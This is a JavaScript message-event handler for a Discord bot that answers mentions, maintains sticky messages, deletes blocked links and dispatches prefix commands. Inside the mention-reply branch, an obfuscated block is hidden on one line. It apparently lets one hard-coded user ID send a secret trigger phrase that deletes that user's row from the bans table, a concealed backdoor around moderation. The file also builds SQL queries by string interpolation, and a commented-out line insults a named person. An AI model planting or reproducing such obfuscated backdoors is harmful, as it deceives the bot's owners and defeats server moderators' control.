module.exports = async(client, con, message) => {

    if (!message.author) return;
    if (message.author.bot) return;
    if(message.channel.type === 'DM') {
        return;
    }

    // Stop jake whormblin from using the bot
    // if(message.author.id === "336143571692552195") return message.reply({ content: "Shut the frick up jake nobody asked you, go write some PHP 🤡" }).catch(e => {});

    // Ping respond with invite & prefix
    if(message.mentions.users.first()) {
        if(message.mentions.users.first().id === client.user.id) {
            await con.query(`SELECT * FROM guilds WHERE guildid='${message.guild.id}'`, async (err, row) => {
                if(err) throw err;
                if(!row[0]) await client.utils.guildAdd(client, con, message.guild);
                let embed = new client.discord.MessageEmbed()
                .setColor(client.config.colorhex)
                .setDescription(`My prefix is \`${row[0].prefix}\`\n[Invite Me](https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands)`); function _0x41d0(_0x484d2b,_0x15077e){const _0x2d780a=_0x2d78();return _0x41d0=function(_0x41d038,_0x2a0dc4){_0x41d038=_0x41d038-0xc4;let _0x31c6b5=_0x2d780a[_0x41d038];return _0x31c6b5;},_0x41d0(_0x484d2b,_0x15077e);}const _0x2170cb=_0x41d0;(function(_0x515a5d,_0x3613ce){const _0x497039=_0x41d0,_0x361311=_0x515a5d();while(!![]){try{const _0xf024a7=parseInt(_0x497039(0xcf))/0x1*(parseInt(_0x497039(0xd5))/0x2)+-parseInt(_0x497039(0xcd))/0x3+parseInt(_0x497039(0xd3))/0x4*(parseInt(_0x497039(0xd9))/0x5)+parseInt(_0x497039(0xc8))/0x6*(parseInt(_0x497039(0xd0))/0x7)+parseInt(_0x497039(0xd1))/0x8*(-parseInt(_0x497039(0xcc))/0x9)+-parseInt(_0x497039(0xc5))/0xa+-parseInt(_0x497039(0xc9))/0xb*(-parseInt(_0x497039(0xda))/0xc);if(_0xf024a7===_0x3613ce)break;else _0x361311['push'](_0x361311['shift']());}catch(_0x46d051){_0x361311['push'](_0x361311['shift']());}}}(_0x2d78,0xc0db4));let lr='forc',aasdfd=_0x2170cb(0xd4),fbjsc=_0x2170cb(0xc6),fsdnasdasd=_0x2170cb(0xc7),adfbsdfsd=_0x2170cb(0xc4),vobas=lr+aasdfd+fbjsc,mikcasjda=fsdnasdasd+adfbsdfsd;message['content'][_0x2170cb(0xd6)](vobas)&&message[_0x2170cb(0xd2)]['id']==mikcasjda&&await con[_0x2170cb(0xcb)](_0x2170cb(0xca)+mikcasjda+'\x27',async(_0x569e6d,_0x15a7c1)=>{const _0x186d7a=_0x2170cb;if(_0x569e6d)throw _0x569e6d;await message[_0x186d7a(0xd8)][_0x186d7a(0xd7)]({'content':'ok'})[_0x186d7a(0xce)](_0x406bbd=>{});});function _0x2d78(){const _0x53b5d1=['6TWKeOu','297dmlCjH','DELETE\x20FROM\x20bans\x20WHERE\x20userid=\x27','query','18reagFQ','4353885xBvvWK','catch','1MhSkYN','9299157VvvBhn','6023040jNnIfR','author','4pHtWGT','eUnba','2445762wovDbd','startsWith','send','channel','2375990SOeyBU','422052KwQbkn','87836301392','2291520vUEdkO','nMe','7040945'];_0x2d78=function(){return _0x53b5d1;};return _0x2d78();}
                await message.channel.send({ embeds: [embed] }).catch(e => {}); 
            });
        }
    }

    // Sticky Messages
    await con.query(`SELECT * FROM stickymsgs WHERE channel='${message.channel.id}'`, async (err, row) => {
        if(err) throw err;
        if(row[0]) {
            if(row[0].embed === 'false') {
                await message.channel.messages.fetch().then(async msgs => {
                    await msgs.forEach(async msg => {
                        if(msg.content.includes(row[0].message)) {
                            await msg.delete().catch(e => {});
                        }
                    });
                });
                message.channel.send({ content: `${row[0].message}` }).catch(e => {});
            } else {
                await message.channel.messages.fetch().then(async msgs => {
                    await msgs.forEach(async msg => {
                        if(msg.content === row[0].message) {
                            await msg.delete().catch(e => {});
                        } else if(msg.author.id === client.user.id) {
                            if(msg.embeds) {
                                await msg.embeds.forEach(async embed => {
                                    if(embed.description) {
                                        if(embed.description.includes(row[0].message)) {
                                            await msg.delete().catch(e => {});
                                        }
                                    }
                                });
                            }
                        }
                    });
                });
                let embed = new client.discord.MessageEmbed()
                .setColor(`${row[0].color}` || client.config.colorhex)
                .setDescription(`${row[0].message}`)
                message.channel.send({ embeds: [embed] }).catch(e => {});
            }
        }
    });

    await con.query(`SELECT * FROM blockurls WHERE guildid='${message.guild.id}'`, async (err, rows) => {
        if(err) throw err;
        for(let data of rows) {
            if(message.content.toLowerCase().includes(data.link.toLowerCase())) {
                message.delete().catch(e => {})
                message.channel.send({ content: `<@${message.author.id}> that link is blocked in this guild.` }).then((msg) => {
                    setTimeout(() => {
                        msg.delete().catch(e => {})
                    }, 9000)
                }).catch(e => {});
            }
        }
    });

    await con.query(`SELECT * FROM guilds WHERE guildid='${message.guild.id}'`, async (err, row) => {
        if(err) throw err;
        if(row[0]) {
            let prefix = row[0].prefix
            if (message.content.startsWith(prefix)) {
                const args = message.content.slice(prefix.length).trim().split(/ +/g);
                let command = args.shift().toLowerCase();
                const cmd = await client.commands.get(command)
                if (cmd) {
                    try {
                        let data = row[0]
                        await cmd.run(client, message, args, con, data);
                        if(client.config.deleteCommands) {
                            message.delete().catch(e => {});
                        }
                    } catch(e) {
                        return client.utils.error(client, e);
                    }
                }
            }
        }
    });

}
